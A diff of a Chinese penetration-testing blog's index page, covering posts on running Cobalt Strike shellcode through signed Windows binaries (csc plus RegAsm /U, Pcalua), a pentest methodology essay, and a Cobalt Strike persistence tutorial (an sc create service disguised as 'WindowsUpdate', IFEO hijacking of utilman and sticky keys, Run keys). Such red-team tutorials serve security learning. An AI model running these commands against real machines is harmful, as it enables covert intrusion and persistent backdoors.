-<p>​        首先使用CS生成一个C#的shellcode，将shellcode插入到<a href="[https://www.c0bra.xyz/2020/02/03/%E7%99%BD%E5%90%8D%E5%8D%95-RegAsm-RegSvcs%E7%9A%84%E5%88%A9%E7%94%A8/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">文章</a>提供的模板中，使用如下命令编译运行</p>
+<p> 首先使用CS生成一个C#的shellcode，将shellcode插入到<a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">文章</a>提供的模板中，使用如下命令编译运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;target:library &#x2F;out:test.dll regasm.cs</span><br></pre></td></tr></table></figure>
 
-<p>​        将生成的dll放置到目标主机上，使用下面的命令加载执行</p>
+<p> 将生成的dll放置到目标主机上，使用下面的命令加载执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe &#x2F;U test.dll</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172923452.png" alt="image-20200810172923452"></p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172937554.png" alt="image-20200810172937554"></p>
-<h3 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h3><p>​        Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p>
+<h3 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h3><p> Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p>
 <p><strong>如何使用？</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua -m -a calc.exe</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810182402572.png" alt="image-20200810182402572"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习，我们可以发现在windows下能执行文件的方式挺多的，但是我们稍微区分一下可以根据是否可以远程加载文件进行区分，可以加载远程文件的方式可以对钓鱼提供某种便利</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 通过上面的学习，我们可以发现在windows下能执行文件的方式挺多的，但是我们稍微区分一下可以根据是否可以远程加载文件进行区分，可以加载远程文件的方式可以对钓鱼提供某种便利</p>
 <p><strong>支持远程加载</strong></p>
 <ul>
 <li>regsvr32</li>
@@ -470,10 +761,10 @@
 <p><a href="https://pentestlab.blog/page/5/?s=applocker" target="_blank" rel="noopener">pentestlab</a></p>
 <p><a href="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" target="_blank" rel="noopener">ired</a></p>
 <p><a href="https://www.cnblogs.com/backlion/" target="_blank" rel="noopener">渗透测试中心</a></p>
-<p><a href="[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html)">专注 APT 攻击与防御</a></p>
+<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html)">专注 APT 攻击与防御</a></p>
 <p><a href="https://blog.csdn.net/God_XiangYu/article/details/106111296" target="_blank" rel="noopener">【免杀篇】远控免杀专题(46)-白名单IEexec.exe执行payload(VT免杀率25-69)</a></p>
-<p><a href="[https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/](https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/)">关于利用rundll32执行程序的分析</a></p>
-<p><a href="[https://www.c0bra.xyz/2020/02/03/%E7%99%BD%E5%90%8D%E5%8D%95-RegAsm-RegSvcs%E7%9A%84%E5%88%A9%E7%94%A8/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">白名单-RegAsm/RegSvcs的利用</a></p>
+<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/](https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/)">关于利用rundll32执行程序的分析</a></p>
+<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">白名单-RegAsm/RegSvcs的利用</a></p>
 
       
     </div>
@@ -1725,199 +2016,12 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" class="post-title-link" itemprop="url">我的渗透之路</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-07-20 20:09:15 / Modified: 21:19:43" itemprop="dateCreated datePublished" datetime="2020-07-20T20:09:15+08:00">2020-07-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不加检点的人生不值一过。</span><br></pre></td></tr></table></figure>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近可能是因为技术处于一个瓶颈期，又或者说对未来技术发展方向有些迷茫，所以写下这篇文章梳理一下当前自身的技能树以及未来的发展方向。</p>
-<h2 id="我的渗透观"><a href="#我的渗透观" class="headerlink" title="我的渗透观"></a>我的渗透观</h2><p>​    根据我自己对于渗透的理解，把渗透分为如下几个步骤：</p>
-<p><strong>信息搜集</strong></p>
-<p>​    这里的信息搜集不仅仅局限于对于目标开放的web资产的情况进行搜集，也可以是人员信息，一些历史漏洞，或者信息泄露的收集，总之一些有利于我们对目标系统进行攻击的信息都可以是我们收集的范围之内。在信息搜集的过程中，我们需要根据自己搜集的结果分析目标可能比较脆弱的点，比如一些VPN,OA,邮件系统或者说是企业内部自用的一些系统。对于这些系统的攻击，我们除了可以猜弱口令或爆破外，也可以去通过钓鱼，信息泄露或者其他途径获取的密码去获得这些系统的访问权限。又或者说有一些比较知名并且非常方便去利用的RCE，比如Weblogic，Shior，Thinkphp,Struts2等等，目标哪些系统使用了这些框架也是我们在信息搜集过程中要做的。</p>
-<p>​    总之，我认为渗透的信息搜集不仅仅是包含了资产收集的步骤，还应该包含目标分析的步骤，这个阶段的结果对我们来说尤其重要，直接决定了我们后续活动的重心，因此，我认为在这个阶段我们可以花费较多的时间去搜集、整理、分析、筛选目标。</p>
-<p><strong>漏洞挖掘</strong></p>
-<p>​    同样，这里的漏洞挖掘并非狭义的指一些web漏洞的挖掘，而是目标整个防御体系的缺陷，任何有可能帮助我们突破目标防御的点都值得我们去深入挖掘。这个步骤我们需要注意的就是明确目标，我们所挖掘的任何信息或者漏洞目的只有一个，为了帮助我们获取目标的一个根据点，不要花费精力去挖一些对于本次活动没什么帮助的漏洞。</p>
-<p>​    就我个人来讲，我不是很喜欢这个过程，可能因为我很少挖到那种比较开脑洞的漏洞，让我觉得挖洞是一个体力活，相比漏洞挖掘，我更喜欢下一个过程。</p>
-<p><strong>漏洞利用</strong></p>
-<p>​    这个过程的目的就是通过我们前面这些步骤操作所挖掘到系统存在的问题，然后通过一些组合利用，让我们获取一个进入目标内网的一个口子，也可以说是突破目标边界。</p>
-<p>​    为什么我喜欢这个过程，因为我喜欢了解漏洞的原理，而且在漏洞利用这个过程我认为比较有趣，尤其是遇到各种拦截，需要我们通过自己的知识去bypass，还有就是因为可能目标环境的问题影响，可能导致虽然是同一种漏洞，但是利用的方法都不太一样。</p>
-<p>​    通过漏洞的组合利用，我们最终构建了一个进入目标内网的通道，这个通道可以是一个反弹shell,一个马，一个http隧道，socks隧道。</p>
-<p><strong>内网信息搜集</strong></p>
-<p>​    当我们进入内网后，我们可能对目标内网是一无所知的，也不知道我们最终的目标在哪里，所以需要进行各种信息搜集，搜集这些信息的目的，主要还是为了定位目标的地址，构建一个从我们至目标的一个可达的途径。主要搜集的一个是目标内网的一个拓扑，通过这个拓扑我们就可以知道目标在哪个位置，还有一个就是目标内网的各种主机和服务的密码，很多时候，我们渗透内网的方式非常的简单粗暴，就是不停的搜集资产，抓密码，撞密码的过程。</p>
-<p>​    因为在某些活动中，我们获取一个内网权限来之不易，为了防止我们在操作的过程中被发现导致权限丢掉了，我认为在内网信息搜集前，应该先想办法去巩固我们的权限，比如多种几个隐秘的shell，还有就是对当前主机的一个权限维持。</p>
-<p><strong>内网横向渗透</strong></p>
-<p>​    关于内网横向渗透，我认为这个过程和漏洞挖掘的过程类似，就是一定要明确我们的目标，假如我们的目的只是内网中的某一个系统，那么去打一圈，控很多系统对我们实际是没有用的，我认为在内网渗透，应该尽量减少我们不必要的操作，因为我们每个操作都有可能给对方留下日志，增加了被发现的风险。</p>
-<p>​    单纯从控更多主机来看的话，首选是通过主机密码去撞，现在还是有很多内网使用通用密码的，其次是通过各种服务的弱口令去搞，比如MSSQL，redis等，这些服务也比较容易帮助我们获取主机权限。再次，就是通过各种高危的web服务，weblogic,struts2等等去搞，最后再去搞目标的其他内网的系统。</p>
-<p>​    也有一种思路就是去针对指定用户比如科技部，信息安全部的内网的邮件，oa系统进行攻击，这些人员可能有内网的各种系统的账号密码，如果能控这个人员的个人机也是非常不错的。</p>
-<p><strong>最后</strong></p>
-<p>​    为什么直接到最后了，经过内网的横向渗透，我们可能已经拿到了我们想要的目标，这时剩下的操作就是两个，一个是权限维持，另一个是痕迹清理，根据自己的需要执行对应的操作就可以了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-title-link" itemprop="url">使用cobaltstrike权限维持</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-02-12 13:57:24 / Modified: 23:24:40" itemprop="dateCreated datePublished" datetime="2020-02-12T13:57:24+08:00">2020-02-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    在我们获取一个beacon后，为了防止掉线，或者防止目标重启后权限丢失，需要进行权限维持，我这里使用Erebus插件进行权限维持。当然这个插件还有其他功能，我这里仅仅对权限维持这部分的功能进行测试。有service、IFEO和AutoRun三种。插件地址：<a href="https://github.com/DeEpinGh0st/Erebus" target="_blank" rel="noopener">Erebus</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">既然要进行权限维持，首先是需要在获取高权的基础上，有两方面因素:</span><br><span class="line">第一点就是获取低权权限维持的意义不大,</span><br><span class="line">第二点是低权无法进行注册表修改等等操作，也不好进行权限维持.</span><br></pre></td></tr></table></figure>
-
-<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>使用service进行权限维持，当开启服务后，即可使目标上线。以下是测试过程：</p>
-<p>首先使用cs获取权限</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210204445767.png" alt="image-20200210204445767"></p>
-<p>然后将我们想要执行的exe上传到目标机器上，我这里是使用cs生成了一个exe，执行后可以反弹shell。</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210204951391.png" alt="image-20200210204951391"></p>
-<p>通过Erebus插件添加服务，选择Persistence-&gt;service。</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210211402844.png" alt="image-20200210211402844"></p>
-<p>添加一个服务，上面的那个参数是服务名，下面的参数是这个服务运行时执行的文件。</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210211725936.png" alt="image-20200210211725936"></p>
-<p>使用这种方式进行权限维持，本质上是执行了如下的命令，不过是写成插件以后比较方便。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;WindowsUpdate&quot; binpath&#x3D; &quot;cmd &#x2F;c start &quot;C:\Users\admin\Desktop\artifact.exe&quot;&quot;&amp;&amp;sc config &quot;WindowsUpdate&quot; start&#x3D; auto&amp;&amp;net start  WindowsUpdate</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200212232104780.png" alt="image-20200212232104780"></p>
-<p>执行成功后，会返回system的shell，无需重启</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212033229.png" alt="image-20200210212033229"></p>
-<p>然后我们重启受害机进行测试，shell仍然存在</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212244400.png" alt="image-20200210212244400"></p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212421777.png" alt="image-20200210212421777"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc delete WindowsUpdate 删除服务</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210214933364.png" alt="image-20200210214933364"></p>
-<h2 id="IFEO映像劫持"><a href="#IFEO映像劫持" class="headerlink" title="IFEO映像劫持"></a>IFEO映像劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">映像劫持：某个操作的时候被拦截下来，干了别的事。</span><br></pre></td></tr></table></figure>
-
-<p>使用IFEO可以实现后门持久化,可以实现系统在未登录状态下，通过快捷键运行自己的程序。比如：Windows + U组合键时启动的utilman.exe，或者5次shift替换粘滞键。</p>
-<h3 id="劫持utilman"><a href="#劫持utilman" class="headerlink" title="劫持utilman"></a>劫持utilman</h3><p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211193950726.png" alt="image-20200211193950726"></p>
-<p>执行后我们可以看到，本质上还是操作注册表</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194149713.png" alt="image-20200211194149713"></p>
-<p>锁屏后使用win+u即可调出cmd</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194300707.png" alt="image-20200211194300707"></p>
-<p>当然，我们可以把命令换成执行我们的payload</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194952327.png" alt="image-20200211194952327"></p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195027355.png" alt="image-20200211195027355"></p>
-<h3 id="劫持粘滞键"><a href="#劫持粘滞键" class="headerlink" title="劫持粘滞键"></a>劫持粘滞键</h3><p>按5下shift出现的粘滞键Sethc.exe，CallBackFile可以根据我们的需求进行更改，也可以执行5次shift后反弹shell</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194448856.png" alt="image-20200211194448856"></p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194506792.png" alt="image-20200211194506792"></p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194535458.png" alt="image-20200211194535458"></p>
-<h2 id="AutoRun"><a href="#AutoRun" class="headerlink" title="AutoRun"></a>AutoRun</h2><p> AutoRun就是我们熟悉的启动项劫持，经常劫持的有如下注册表选项：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195244752.png" alt="image-20200211195244752"></p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195351287.png" alt="image-20200211195351287"></p>
-<p>重启后生效</p>
-<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195537803.png" alt="image-20200211195537803"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    其实这些方法都可以手工完成，使用插件就是可以方便一些，权限维持的方式还有很多，有能力的朋友也可以写成插件的形式，提升渗透效率。</p>
-<p>参考：</p>
-<ul>
-<li><a href="http://blog.leanote.com/post/snowming/de88219734d1" target="_blank" rel="noopener">Cobalt Strike 中的权限维持和团队服务器之间的会话传递</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
 
 
 
@@ -1982,12 +2086,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
